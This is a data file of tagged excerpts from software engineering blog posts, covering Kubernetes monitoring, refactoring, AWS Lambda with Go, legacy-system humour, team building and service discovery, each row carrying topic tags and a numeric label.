2519,"With this environment set, we are going to monitor a simple web application exporting Prometheus-format metrics. A Prometheus Operator has to access Kubernetes API, nodes, and cluster components, so we should grant it some permissions. We can do this via the Cluster Role resource that defines an RBAC policy. The Cluster Role contains rules that represent a set of permissions. These permissions are additive, so we should list them all. We will be using the Cluster Role resource that can grant permissions to manipulate resources of the entire cluster as opposed to Role which is namespace-scoped.","['Kubernetes', 'Prometheus', 'Operators', 'Prometheus Operator', 'Monitoring']",11
2520,"Now, lets save this spec in the __url__ and create the deployment: Verify that the deployments pods are running: At this point, the Prometheus Operator has no apps to monitor. Thus, before defining Service Monitors and Prometheus CRD, we need to deploy some app shipping Prometheus-format metrics. For this purpose, we used an example application from the Go client library that exports fictional RPC latencies of some service. To deploy the application in the Kubernetes cluster, we containerized it with Docker and pushed to the Docker Hub repository. Lets deploy this example app serving metrics at /metrics endpoint which Prometheus watches by default. Below is the deployment manifest we used: Please, note the container Port is 8081 which is the port defined in the application code.","['Kubernetes', 'Prometheus', 'Operators', 'Prometheus Operator', 'Monitoring']",11
2521,"In the example above, we visualized rpc_durations_histogram_seconds metrics. As you see, we used a stacked option for time series visualization, but you can opt for simple lines, of course. You can play around with other RPC metrics and native Prometheus metrics as well. The web interface also supports Prometheus query language Prom QL to select and aggregate metrics you need. Prom QL has a rich functional semantics that allows you to work with time series, instance and range vectors, scalars, and strings. To learn more about Prom QL check out the official documentation.","['Kubernetes', 'Prometheus', 'Operators', 'Prometheus Operator', 'Monitoring']",8
2522,"The books cover a mix of areas such as software design and management or people topics. Each brief review contains sub-sections on Why you should read it and Older or similar books.2018, by Adam Tornhill Following Your Code as a Crime Scene, Adam Tornhills new book is about the fascinating topic of code analysis and code health. Its one of the most substantial books Ive ever read about software engineering. The author demonstrates a number of techniques (mostly based on data from version control systems) for identifying hotspots, complexity trends, coupling, or refactoring opportunities. All material is properly backed up with examples, references and a couple of intriguing visualizations. After reading the book you might ask yourself: How do you best apply and integrate your new knowledge into your engineering process and how do you convince co-workers of the value of the approaches? Luckily, theres tooling support, so start small and keep improving Youll learn how to analyse code bases, how to keep your code healthy, and how to organize teams to ultimately create more sustainable work. Definite must-read if youre accountable for quality in your role as software engineer, architect, or engineering manager.","['Software Engineering', 'Books', 'Reading', 'Learning', 'Articles']",9
2523,"Somehow related: Designing Distributed Systems, Designing Microservices, Patterns of Enterprise Application Architecture2017, by Erik Dietrich This book is probably the most unique in the list and unlike everything else Ive read so far. Id not recommend it to software engineers early in their career since theres a good amount of cynicism about the politics and dynamics in corporate and startup software development. Its one of the books that I couldnt put down since its written so well and explains the driving forces behind our corporate structures, management styles, and career ladders. If you decide to read it, youve taken the red pill If you enjoy being employed in a pyramid-like company structure, it shows you how to play the game. If youve been into software engineering for a while, youre likely to recognize a lot of the mentioned behaviours in your co-workers, bosses, and company politics. While the book might disenchant you, it also unveils how to change things to your advantage without manipulating people (no spoiler)Probably none, maybe The Mythical Man-Month, Peopleware, and Adrenaline Junkies and Template Zombies to some degrees2017, by Camille Fournier The more experienced you get as software engineer, chances are the more you need to take on additional responsibilities in management and leadership. The Managers Path covers the entire journey from being an engineering lead of a single team to managing multiple teams and representing the technical leader of a company. Its a pragmatic and authentic book about technical leadership, management, and people topics in tech companieswithout much of the dramatizing and shallow advice that you often find in other people books.","['Software Engineering', 'Books', 'Reading', 'Learning', 'Articles']",2
2524,"Implicit in these types of refactoring workflows is the idea that we dont treat refactoring as a separate project. The project refactoring idea introduces several problems, including the idea that we can clean up the code sometime in the future. This is akin to only cleaning your dishes once your sink is full of dirty dishes and overflowing. Instead, opportunistic refactoring techniques encourage building the habits and skills for daily improvements to the code. It helps teams practice and learn the value of continuous improvement, a key component of lean. If technical improvements (i.e., technical debt paydown) or design improvements arent in support of delivering better experiences (e.g., operational stability, performance, etc.) or more value to customers, I would question their merit.","['Software Development', 'Refactoring', 'Extreme Programming', 'Modern Agile', 'Legacy Code']",9
2525,"Instead, they decide to use opportunistic refactoring techniques. When a new feature is added or an area of the code is modified, the team includes the work to refactor the infrastructure code necessary to transition to the new ORM. This workflow is part opportunistic refactoring, and part infrastructure improvement, but should not change any user-visible behavior of the system. After six months, 80% of the application has been converted to the new ORM. However, the team has a dilemma. They now need to support two third-party ORMs. The areas of the code that arent using the new ORM are the areas that are rarely changed. So, they may indefinitely need to support both ORMs if they only rely on opportunistic refactoring techniques.","['Software Development', 'Refactoring', 'Extreme Programming', 'Modern Agile', 'Legacy Code']",9
2526,"Refactor code in support of the work your team is currently doing. Great software design is measured by how safe and simple the code is to change, maintain, and understand. We rarely know exactly how we will need to change the code in the future. Software design is a process of tradeoffs. Some designs make one kind of change easier at the expense of another. Refactoring is a vital step to always keep the codes design optimal for the kinds of changes that are required, without needing a crystal ball.","['Software Development', 'Refactoring', 'Extreme Programming', 'Modern Agile', 'Legacy Code']",13
2527,"Rendering videos can be quite resource intensive, so we have built many systems to monitor and lighten the rendering load. The most important factor in lightening the load of our rendering system is heavy usage of caching. We calculate hashes for a video template and products array pairs, and we store them in a Redis cache. If the same video template with the same products is asked for again, we simply return it from the cache. After all, the cheapest renders are those you do not have to do at all! This has been a quick look into how we built our video templating system. Building a full fledged video editor with web technologies continues to be an interesting endeavour. There are multiple challenges that we need to keep tackling like for example making sure the editor stays performant, which is not a given as we are using React to render a video canvas. We also need to make sure to keep the editor accessible to everyone, but powerful enough.","['React', 'Redux', 'Nodejs', 'Postgresql', 'Typescript']",6
2528,"To be clear, this is still an exploration. An early idea I wanted to throw out there. But before I dive into what it is and what it could solve, let me give you some context about our problem, and why I think this idea is compelling. Warning: It may not solve the exact problem that you have. Read more and decide for yourself, this is not a silver bullet or a best practice. I assume some basic knowledge of g RPC/Thrift, Graph QL and Type Script/Flow.","['Typescript', 'GraphQL', 'Grpc', 'Microservices', 'Software Development']",14
2529,"Creating content is a creative process, and made possible by the collaboration of different business units. Creating a new show is like creating a startup. You worry about where the money is going to come from. How will we hire people to do the work? In entertainment, its the same questions. How we will finance the show? Who will be the showrunner (for TV), or director (for movies)? How will we cast actors and actresses, and hire the best grips, editors, camera operators, and more? In moving fast, we were also able to learn fast. We learned that these sub-domains made up a larger graph. And that we needed to connect them together to truly push the business forward.","['Typescript', 'GraphQL', 'Grpc', 'Microservices', 'Software Development']",6
2530,"At $DAYJOB most of our Lambda functions are in Pythonit offers a decent developer experience, good start-up times and is familiar to the whole development team. However when working with AWS APIs I yearn for static typing on almost daily basis. The requests and responses in the AWS SDK are non-trivial and on more than one occasion that has lead to bugs due to wrong assumptions on their structure that have made it all the way to the unit tests of the application. Discovering these things in integration tests or when the code is deployed to dev environment is not fun. Gos static typing should alleviate at least some of those issues without introducing too much clutter in the code thanks to its lightweight struct literal syntax. In addition to that its a delightfully boring/simple language with excellent performance, nice deployment story and a sublime standard library. You may not enjoy it if you absolutely must have generics, exceptions, functional patterns or any programming language features invented after the 1970s but in the scope of small programs like Lambda functions these are hardly an obstacle.","['AWS Lambda', 'Aws Sam', 'Go', 'Serverless']",9
2531,"On Faa S platforms the functions dont live in a vacuum: at the very least they need some integration to the outside world to trigger their execution. Most likely they also depend on some other cloud resources such as persistence layers or messaging systems and permissions to access them. Managing all this manually using management consoles is a bad practice and quickly becomes unfeasible but doing it the Right Way requires a considerable amount of code in Infrastructure as Code tools like Cloud Formation or Terraform. Fortunately alternative approaches such as the Serverless framework exist. They reduce the amount of code required to deploy serverless applications and dependent resources by abstracting away common details, generating permissions and even configuring full resources such as API gateways automatically. While Serverless is a third party framework, SAM is an open source effort by AWS Labs to provide this functionality as a Cloud Formation translator. AWS Labs has also implemented a nice command-line tool that generetes project skeletons, helps with build and deployment tasks and running Lambda functions locally. It also has some surprising shortages in the feature department, some of which well be addressing and working around in the inevitable sequel to this post.","['AWS Lambda', 'Aws Sam', 'Go', 'Serverless']",10
2532,"The example application is a Feelings poll. In this post well be building a back-end API that receives PUTs of respondents mood covering the full spectrum of human experience from very bad to very good discretized into integers on a scale of 0 to 3 and allows the user to GET poll results for a specific date. Why implement something using Google Forms in 5 minutes when you can potentially get hours of fun, a couple of blog posts and a few important lessons out of it? The application is structured as follows: The package db contains a shared library that provides a couple of types representing our model and funcs to store and fetch them from Dynamo DB. This is wrapped by two HTTP verb-specific Go executables that will be deployed to AWS Lambda to handle events from Amazon API Gateway. The project root directory contains Gopkg files used for dependency management by dep (Im still stuck at Go 1.10 due to Go Sublime stable version limitations and never got into vgo), the SAM template and a makefile used to perform common build, packaging and deployment tasks. The latter two are based on ones generated by SAM, so lets hit the tutorial mode.","['AWS Lambda', 'Aws Sam', 'Go', 'Serverless']",6
2533,"The SAM command-line tool is written in Python so having Python 2.7 installed is a prerequisite. Also Docker and aws-cli are required. The easiest way to install SAM cli is using pip: SAM has support for plenty of Lambda runtimes and defaults to __url__ if not told to do otherwise. Since were using Go, run the following command under $GOPATH/src/<optional-github-stuffs>: What you get from this is a basic makefile and a nice small example application that demonstrates the basic structure of a Go lambda handler and a tutorial in the readme. Both the handler example and the readme are worth a read. However, when getting ready to build the application by running make deps to install the dependencies we encounter our first gotcha: It looks like the generated makefile assumes that we are working within a git repo already synced with a public upstream origin. Here you have two options depending on what youre doing and whats your preference on Go dependency management: Keep using go get for dependency management. Either modify the makefile to get the third party dependencies explicitly or set up a remote (for example a public Git Hub repo), configure it as an upstream origin and push the code there already in this infant stage.","['AWS Lambda', 'Aws Sam', 'Go', 'Serverless']",7
2534,"This brings me to my first blunder. (Yes, I said warts and all! )We had a few issues because I wasnt clear enough in the design phase. In the new site we ended up actually loading a page when someone clicked on what used to be a category in Zendesk. So, for example, if we had a category called Importing your data that included articles about importing your data, the new system actually loaded an empty page called Importing your data when you clicked on that heading in the TOC. In the short term, we worked around this by adding some introductory/overview text to that page. And we removed the page voting functionality.3. Heavy Lifting We needed a way to publish the site once we had our HTML5 help center built. Luckily, our authoring platform (Paligo) can generate an HTML5-based doc set from our source files, so the only tricky part was getting __url__ file published to the new site with all the changes we wanted to include.","['Documentation', 'Technical Publications', 'Zendesk']",6
2535,"For example, in our first design iteration, we missed adding a show/collapse control for each of the categories. In fact, our authoring platform doesnt support that and doesnt plan to. But we have a very long list of articles in one of our categories and so when that list is expanded in the TOC, the user needs to scroll to the end of the list in order to see the next category. Once we saw the site in action, we realized we needed to add that feature.5. Other things to consider If youre moving away from Zendesk entirely, youll want to think about things like Contact us addresses and open a case links.","['Documentation', 'Technical Publications', 'Zendesk']",6
2536,"Make sure your publishing system works for you, and not the other way around. For example, if you want to publish a single file, do you need to regenerate and publish the entire site? Can you roll back a change? We use Git and publish to a staging area for review before publishing. For some people, those arent really valid concerns, and the overhead/complexity is a high bar. For us, its a pain point were looking to address in the next phase.","['Documentation', 'Technical Publications', 'Zendesk']",18
2537,"A deep dive summary at Shopify includes (but is not limited to): Context: High-level product information, and details on what insights were gathered through this research Metrics: Overview of how the product is performing since launch (eg. funnel information, # of support interactions over the period, other KPIs)Takeaways: The top 35 trends observed in the research, and their current status (Is still a problem or has the team fixed this issue?). Each takeaway should have a data point (eg. % of support interactions over the period related to each trend)Quotes/Feedback: Quotes to help convey customer sentiment (both good and bad)Retrospective insight: Overall verdict of how this launch went (eg. what went well, and what could have been improved)Additional resources: Where to see the research inputs, how to get more information on open issues, and any other relevant resources Compelling stories stick. Every day, your support team gets to know your customers on a personal level and gains an understanding of why they reached out for help. You can use examples from real customers to get your team and your stakeholders onboard with solving an issue. Things like quotes about why something is an issue, or videos showcasing a broken product flow all help build customer empathyand Support has tons of these to share.","['Product Management', 'Support', 'Product Manager', 'Customer Feedback', 'Shopify']",6
2538,"Why should we prefer to port complex programs into Software 2.0? Clearly, one easy answer is that they work better in practice. However, there are a lot of other convenient reasons to prefer this stack. Lets take a look at some of the benefits of Software 2.0 (think: a Conv Net) compared to Software 1.0 (think: a production-level C++ code base). A typical neural network is, to the first order, made up of a sandwich of only two operations: matrix multiplication and thresholding at zero (Re LU). Compare that with the instruction set of classical software, which is significantly more heterogenous and complex. Because you only have to provide Software 1.0 implementation for a small number of the core computational primitives (e.g. matrix multiply), it is much easier to make various correctness/performance guarantees.","['Machine Learning', 'Artificial Intelligence', 'Programming', 'Software Development', 'Future']",9
2539,"It seems so innocent to just say screw the tests! and just keep trucking along, building out features and making things fly around on the screen. This is so painfully common for startups and newbie programmers. Why bother with testing the UI!? It changes so much anyways, its not even worth trying to write tests! Of course the UI will constantly change. Businesses and Scrum masters want to keep iterating on an idea and make it better and better, so if its always going to keep on changing and getting more features, does that mean the tests from before even make any sense? When the business is iterating over an idea, youll still need all previous functionality to always be working when youre building out new features with each iteration. With this kind of logic, why wouldnt you want that safety blanket of unit tests to make sure this is always working? Otherwise, youre just asking for regressions and features from past iterations to no longer work.","['Testing', 'Development', 'Programming', 'Tdd', 'Engineering']",13
2540,"This is best seen through example. Heres a very straightforward function that adds two numbers together: To test this, wed use something like expect and a framework like mocha or chai. For the purposes of this article, Ill be using jest with jasmine since those come right out of the box with minimal configuration: Great! Now we know every time we run this function, it will add these two numbers together. It didnt take that much time to write up a quick test to make sure this works Business requirements have changed and were iterating on this little helper function weve made. It now has to accept up to 4 arguments and add them together now. no problem, we can refactor this to make that happen.","['Testing', 'Development', 'Programming', 'Tdd', 'Engineering']",9
2541,"We have run the steps necessary to create the kibana/ __url__ and kibana/ __url__ files which we also committed to the repo, however, they can be recreated again using the install-deps tool that we contribute. These files are used for faster installation of the dependencies by docker. The Dockerfile v2The Git Hub Repository Previously Opaque Method The Improved Approach Trust But Make Your Own The Install-Deps Interactive Tool Source Code Acquisition And Modifications Using Alamode To Transpile Project Code Patching src/server/kbn_server Summary Download the snapshot image, modified code in the kibana/src/cli/ __url__ and kibana/src/server/kbn_ __url__ files, push changes to Git Hub, and release with a tag like v1.3 and message like Proxy via the Git Hub web interface.2. Every release got downloaded in a temporary Dokku container created on git push to the Dokku host. The image was made using the Dockerfile that was pushed to Dokku running the kibana app. The created image, after manual testing, was tagged as artdeco/kibana and pushed on the Docker Hub. As a result, newer apps could just spawn a container from the artdeco/kibana image and only had to pass the ELASTIC_SEARCH host URL in the environment variable.","['Docker', 'Kibana', 'Elasticsearch', 'Authentication']",7
2542,"E. Prepare the zip file that will be uploaded to Lambdazip __url__ *.py *.json (Zips all the python and json files)cd $VIRTUAL_ENV/lib/python3.6/site-packages (Navigate to where your virtualenv packages are stored, this may differ for each user. I use pyenv for maintaining my virtualenv)zip -r9 {path_to_project_file}/lambda.zip. (Adds the appropriate python packages to the zip file that will be uploaded to Lambda. If you get a zip error: Nothing to do! simply erase and re-add the space between __url__ and. theres something funky with how whitespaces are handled when copied from Medium)If you ever update your code without touching the packages, just runzip -g __url__ *.py *.json F. Upload zip file to S3 and then to Lambda Navigate back to the project directory and run the following:aws s3 --profile apartment-prices cp __url__ s3://apartment-prices/ (uploads files to S3)aws lambda --profile apartment-prices --region us-west-2 update-function-code --function-name apartment Price --s3-bucket apartment-prices --s3-key __url__ (upload from S3 to Lambda, make sure the arguments are correct profile,region,function-name,s3-bucket,s3-key)G. Configure Lambda settings Go back to your Lambda function on your AWS console page. Set the handler to be the correct value. {function_name}, so in our case lambda.handler.","['AWS Lambda', 'Google Sheets', 'Slack', 'Cron', 'Web Scraping']",7
2543,"Here, for your education and entertainment, I present a bestiary: a field guide to the monsters and the creeping horrors that are lurking somewhere in your IT systems.1. The Reliquary The reliquary is that one repository full of really good ideas. The Open ID implementation that you optimised until it shone. Classes so beautifully designed and perfectly documented that theyd make a senior architect weep.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",9
2544,"In fifty years time when were all running genetic algorithms on bioengineered quantum hardware that eschews physical user interfaces in favour of superimposing consciousness patterns directly onto our brains by inducing cross-dimensional electrical fields in a neighbouring parallel universe, at least one company will have made a fortune creating a post-singularity hosting environment for running Visual Basic 6 line-of-business applications in the quantum realm.3. The Epic of Gilgamesh You know this one. It started out as a simple database querysomething that pulled out the sales figures for the last quarter. Then somebody tweaked it to account for currency fluctuations. Somebody else cross-referenced it against website traffic logs. Somebody else added a half-dozen LEFT OUTER JOIN statements so you could find out which web browsers that the customers who created the accounts, and who raised the invoices that generated the revenue, were using.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",5
2545,"Sometime around 2008, the SQL query in question surpassed Queens Bohemian Rhapsody in length and scope. By 2012 it was longer than Beowulf and about as readable. It now stands as one of the great literary epics of our generation, a heartbreaking work of insane genius that is as incomprehensible as it is breathtaking.4. The Chasm of Compliance Some friends of mine used to work in the software division of a company that made scientific instruments. Big government clients, universities, hospitals, research laboratories. As part of the conditions of doing business with these kinds of clients, they had a very strict policy that forbade sending email attachmentswhich was backed up with a set of firewall rules that would block incoming and outgoing mail with any files attached to it.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",16
2546,"It would terrify you how much of your operating revenue comes out of that chasm.5. The Shibboleth Once upon a time, there was The Password. Being entrusted with The Password was a rite of passage. The Password was the nuclear launch codes, the keys to the city. Maybe it was the root password to the production web server. Maybe it was the sa password to the main database stack, or the master account password for the COBOL mainframe that handled all the financial records.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",16
2547,"Naturally, when you rolled out your new GDPR-compliant single sign-on, you changed the password. And then, when every single piece of software in your organisation went into a screaming panic, you immediately changed it back. And somewhere, theres a backlog of the applications that need to be updated before you can change The Password. Youve done the easy ones, obviously. But you havent got around yet to remoting into the VM where the Doctor Gonzo (qv) resides, and even if you could, youve no idea what algorithm the developers used to encrypt the connection string before pasting it into the INI file thats eventually got transplanted into the Windows registry.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",7
2548,"The shibboleth is a powerful incentive to ensure that your tech staff leave on good terms. They know full well that if they give you any reason to doubt their integrity and trustworthiness following their departure, itll be a lot cheaper and easier just to have them killed than it will be to change the master password.6. The Masquerade Column This ones a doozy. Somewhere in your organisation theres a text column in a database. It was designed for your staff to make notes. Its probably called something like Comment or Description. 250+ characters of beautiful, unvalidated text. And, for many years, thats exactly what it was used for until that one fateful afternoon when a couple of developers were sat around trying to plan a feature. One of them said, Can we add a field to the database to store the order type? And somebody else replied, We COULDbut then wed need to update the stored procedures and regression test any apps that are using column indexes, and itll turn a three-point ticket into a couple of weeks of work.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",0
2549,"Back in the glorious days of the first dotcom bubble, I once proposed using the description field on a table to store a SQL statement that needed to be generated when an order was raised, but not actually executed until the order was confirmed. I may have used the phrase continuation passing to make it sound impressive. Fortunately, the client pulled the plug on the entire project before it went anywhere.7. The Folly This is probably linked from your homepage. It definitely features prominently in your sales literature. Maybe you even ran a campaign about it. Its a massively complex feature that was designed, built, shipped and in the five years since it went live, its been used by exactly nine people. The folly is normally built as a sweetener.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",6
2550,"Does that remind you of anything in your software? That one innocent-looking database table that if somebody adds a row to it the entire website crashes. The button in your intranet dashboard that says something like download CSV and if anybody clicks it the main database server instantly hits 100% CPU and stops accepting any more connections for a good twenty minutes or so. The DLL that has to be installed into C: Users Temp (because Reasons) and if its not there its a toss-up as to whether the phone starts ringing before the website goes down, or immediately afterwards.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",17
2551,"That file that cant possibly be doing anything? Probably best not to touch it. No matter how cute and fluffy it might look.9. The Phantasm Somewhere in your organisation, theres a piece of critical physical infrastructure that is so well hidden its indistinguishable from magic. And a true phantasm always starts out with somebody trying to make things look nice.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",7
2552,"Back in the days of wired networks, a really good phantasm was hard to accomplishyou could always follow the wires. But in these days of wireless networks, its the easiest thing in the world to stick a wi-fi access point up above a ceiling tile somewhere and forget about it. Ten years later, your successors will thank you when they get asked to find out why the internet has stopped working. After furiously arguing for three or four hours that the internet NEVER worked because theres clearly no wi-fi points anywhere on that floor, they end up ripping the entire ceiling down in a desperate attempt to work out whats going onand find a dust-bunny the size of a basketball with the last few inches of a wifi antenna forlornly poking out of it.10. The Paradox The paradox is a rare and beautiful artefact in modern software systems. Its something that cant possibly exist according to its own rules, and yet it does. The classic paradox is a table full of customers with no email address, in a system that (a) defines a customer as invalid unless the email address is populated, and (b) rejects any update to objects that are not valid. This can lead to HOURS of fun chasing your own tail up and down the aggregate graph trying to work out why youve managed to get seventeen validation errors without changing a single value.","['Programming', 'Legacy Code', 'Software Development', 'Clean Code', 'Coding']",17
2553,With Terraform its super easy to define your infrastructure in a developer-readable fashion. You can provision it through a streamlined flow. And all the changes to your infrastrcture are traceable. Terraform is such a game-changer for us. It gives us more control over our infrastructure. That improves our development pipeline drastically.,"['AWS', 'Terraform', 'Dynamodb', 'DevOps', 'Cloud Computing']",10
2554,"Your custom templates are stored under the following path ~/Library/Developer/Xcode/Templates. When you first navigate to this path you may find it empty, this is expected as you may not have any custom templates. In your Templates folder you first create a folder called Project Templates. This folder will then hold all your project templates. If you want to create file templates then you create a folder called File Templates. It is important to get the names correct otherwise Xcode wont recognise your custom templates.","['iOS', 'Xcode', 'Swift Programming', 'Objective C', 'Creating Templates']",18
2555,"In a perfect world one has the right team, enough budget, and a realistic timeframe. Software Managers are given team members based on availability, budgets are pre-set and timeframes are rushed. The problem becomes, how does one deliver a quality product within these limitations? Billy Beane, the Baseball Executive for the Oakland Athletics, had similar stipulations for his team. A statistical approach to determining what positions on the team required the best players. In other words, given a smaller budget than needed to compete in Major League Baseball, what is the best way to spend it? The results went against the traditional approach, making the playoffs on a shoestring budget. Concluding with a book by Michael Lewis and later movie of the same name. While powerful for sports management, this team building strategy has many applications in other fields.","['Software Development', 'Team Building', 'Software Engineering', 'Management', 'Leadership']",1
2556,"Software Leaders have similar issues to Baseball Managers. That is to pay for proven talent at a premium or take a chance on young, unproven developers at much less cost. While the large companies can and do hire the big names (in baseball and software), smaller organizations often have to settle for less. That is, until they determine the positions key to the teams success. In other words, what are the most valuable attributes for their company? Every person and by default team, has limitations. In software, this means areas of inexperience where actual ability does not match the current requirements. Becoming apparent in the middle of a project plagued by trouble.","['Software Development', 'Team Building', 'Software Engineering', 'Management', 'Leadership']",12
2557,"Since every team has areas of weakness, where do the strongest members need to be. To put it another way, what roles are your best developers fulfilling? Is it a strong back-end presence or an excellent Dev Ops Engineer? Perhaps a Front-end Developer who thinks in Java Script is the most important. Chances are, not every position on the team needs an expert. Some of the roles could get by with a minimum level of competence.","['Software Development', 'Team Building', 'Software Engineering', 'Management', 'Leadership']",0
2558,"Billy Beane was hiring beyond basic competency since every member hired came from Professional Baseball. they had an expertise in the required field. It was only after they made the cut to be in the Major League that the other attribute was applied. Thus, managers need to hire competent developers with the chosen attribute(s).","['Software Development', 'Team Building', 'Software Engineering', 'Management', 'Leadership']",12
2559,"In contrast, a team dedicated to goal achievement may not accomplish as much as a team dedicated to rapid development. However, the end result will be greater. It may take an extra week to complete a release. That is not always a bad thing. A great team will set its own pace based upon quality of work. Great management listens and gives them the time needed to make something worthwhile.","['Software Development', 'Team Building', 'Software Engineering', 'Management', 'Leadership']",1
2560,"This topic is somewhat polarizing in the development world because there are developers who dont think there should be such a heavy focus on computer science topics like tree traversal, sorting, algorithm analysis, matrix manipulation, etc. However, there are companies like Google that are notorious for asking these types of questions in their interviews. As someone said about the Front-End engineering interview at Google: While there are companies that practically require applicants to have a computer science degree or equivalent, there are plenty of companies that will hire people without this technical qualification if they can prove that they know how to develop applications and show an understanding of the whole domain. But part of being a competent developer and not writing inefficient code or using the wrong tools is an understanding of some basic algorithms and data structures and being able to analyze trade-offs. So here are some things you should definitely learn: Improving your Algorithms & Data Structure Skills Article Study hash tables and try to understand them on a deeper level. This data structure underlies objects in Java Script (dictionaries in Python and hashes in Ruby).","['Programming', 'Web Development', 'Full Stack', 'JavaScript', 'Coding']",12
2561,"The Redux websitepoints out these three conditions that ought to be met to justify its use:1. You have reasonable amount of data changing over time2. You need a single source of truth for your state3. You find that keeping all your state in a top-level component is no longer sufficient In our case, we didnt feel like meeting any the above criteria. So, although Redux seems very popular among Flutter developers, for Offhub it would probably be on the over-optimised side. On the other hand, the MVVM pattern seemed just well-fitted for the limited needs.","['Android', 'Apps', 'Dart', 'Flutter', 'iOS']",15
2562,"The application is now ready for providing a third-party API interface to other users. The API is defined within the core part which will be used by the backend and frontend: The change of the major protocol interface implicates larger adaptions within the backend of the application. As an example, the login with credentials (username and password) handler function now looks like this: At first, we unpack the CBOR content from the HTTP request. Afterwards, a small sanity check for empty username and password will return an HTTP 401 (Unauthorized) error in that case. This is another benefit to the previous Web Socket based approach since we now have a more clear error reporting interface via HTTP codes. Furthermore, it is now possible to use the more concise future-based programming style the Rust futures crate offers. After the sanity checks we create a new session token and put it directly into the database via the Diesel object-relational mapping (ORM). In general, the request handling is now better separated and much more clearer than the initial approach. The first major change within the frontend is that the router has now its own repository and can be used by other yew-based applications too. Routing to dedicated components of the frontend is now really easy and can be done like this (pseudo) example: A fully working example is included within the Root Component of the __url__ application.","['Rust', 'Webassembly', 'Web App Development', 'Rustlang']",11
2563,"Architecture is a hypothesis, that needs to be proven by implementation and measurement Tom Gilb Architecture is an expression of an idea. Your job is to test the idea. What you can build is influenced and constrained by how you build itand vice-versa. Its expensive to know everything upfront. You need to be okay with going back often and making changes as you move forward with the project. Architectural thinking is based on knowledge, which requires learning. Learning occurs throughout a software development project. Development increments should be based on functionality rather than component structure.","['Agile', 'Software Architecture', 'Software Engineering', 'Software Development', 'Cloud Architecture']",12
2564,"The ability to simplify means to eliminate the unnecessary so that the necessary may speak Hans Hofmann Architectural definition is something that answers three questions: What are the structural elements of the system? How are they related to each other? What are the underlying principles and rationale that guide the answers to the previous two questions? Nothing is more dangerous than an idea, when you have only one idea Emile-Auguste Chartier We should always understand the context and richness of the software that we are designing. Based on that, we should propose at least 3 things that might go wrong. We need to validate our hypothesis on these potential failures or errors. When we are making progress developing our software, we are gaining more knowledge from things that work and dont work. We should be comfortable starting from the beginning if we noticed a flaw in the architecture.","['Agile', 'Software Architecture', 'Software Engineering', 'Software Development', 'Cloud Architecture']",5
2565,"Architectural questions and considerations when redesigning our software: Where are the defects? Is there a reason they are distributed that way? If you cant think of three things that might go wrong with your plans, then theres something wrong with your thinking Jerry Weinberg Architecture is about codifying knowledge. You should be able to iterate on your architecture until you get a Minimum Viable Product. Any changes in the future should not be costly. Adding more developers to a project as the project grows will not automatically speed up the project. Dont spend too much time at the beginning designing; instead, just build it and see what happens. With good architecture, you can make mistakes continually and still make progress.","['Agile', 'Software Architecture', 'Software Engineering', 'Software Development', 'Cloud Architecture']",12
2566,"Sustainable development is development that meets the needs of the present without compromising the ability of future generations to meet their own needs The Report of the Brundtland Commission Interested in learning more about software development? Read my other article on: 7 Lost Principals of Continuous Delivery I met Kelvin Henney at the GOTO Chicago 2018 conference. Kevlin Henney is an author, presenter, and consultant on software development. He has written on the subject of computer programming and development practice for many magazines and sites, including Better Software, The Register, C/C++ Users Journal, Application Development Advisor, Java Spektrum, C++ Report, Java Report, EXE, and Overload. He is a member of the IEEE Software Advisory Board. Henney is also coauthor of books on patterns and editor of 97 Things Every Programmer Should Know.","['Agile', 'Software Architecture', 'Software Engineering', 'Software Development', 'Cloud Architecture']",12
2567,"As the token operator amongst developers with a little bit of networking experience, I get a lot of requests from developers that sound a bit like this: Networking is an intriguing field with fantastic acronyms that rival our modern texting lexicon and works like magic. However, for the software engineer, its not always clear why the network matters and how it affects an application. We take it for granted that when our application sends a GET request to another application, we just receive a response. But under the hood, why does it matter? What simple terms should we know to communicate about our application networking? This is not an overview of the OSI reference model or networking layers. It is not intended to train anyone for a network certification, help configure a switch, or outline every detail about software-defined or container networking. It will not help answer the omnipresent interview question, What happens when you type a URL into the browser and press enter?","['DNS', 'Load Balancing', 'Service Discovery', 'Containers', 'Networking']",10
2568,"The detailed error tells us the Name is not resolved. When service discovery doesnt work the way we intend, we cant get to our service for fun or profit. When I first worked in enterprise applications, I was really confused by the idea of service discovery. I should easily be able to obtain some URL for my application and be done, right? In the enterprise, this want tends to more difficult to address. Rather than cover the general case of typing a URL into a browser, lets address the nuances of service discovery in the enterprise.","['DNS', 'Load Balancing', 'Service Discovery', 'Containers', 'Networking']",11
2569,"Registration reserves the human-readable alias for our use. Resolution isnt just direct me to my application, it is For example, think of the public restroom. When a stall is in use, no one else can use it. If there are more people than stalls, then there exists a queue of angry people waiting to use the restroom. Similarly, when users connect to an instance of an application, that instance is in use. No one else can use that application and other users have to wait for their turn until the application has completed the intended process. It can be pretty frustrating as a user, especially when we are buying a phone on sale during Cyber Monday or investing in cryptocurrency. In order to handle the increased load (number of users) on the application, we need to have multiple application instances to help process all of these users requests. When we have multiple application instances, which one do we resolve to during service discovery?! Even worse, most application instances arent actually identified in a nice, human-readable way. Instead, theyre identified by their IP addresses. The worst case scenario is when IP addresses are statically defined in applications. When IP addresses change, everything breaks! We cant make sense of which instances actually belong to our application, short of remembering the IP address sequence or adding it to some inventory database. With multiple instances, we need some kind of technology to: Remember which IP addresses belong to our application.","['DNS', 'Load Balancing', 'Service Discovery', 'Containers', 'Networking']",11
2570,"Software-defined load balancers can be very powerful, in that they can be configured to automatically register instances based on metadata or networking configuration. For more information on public cloud load balancers, check these references for GCP, AWS, or Azure. If we are not using the public cloud, there are vendor tools that can offer the same automation and functionality. By offering a load balancer on-demand, service discovery can be optimized for cost and elasticity. Instances can de-register and delete or register and provision very responsively to load. As a result, we can horizontally scale with smaller application instances in greater quantity rather vertically scale with larger application instances in smaller quantity.","['DNS', 'Load Balancing', 'Service Discovery', 'Containers', 'Networking']",11
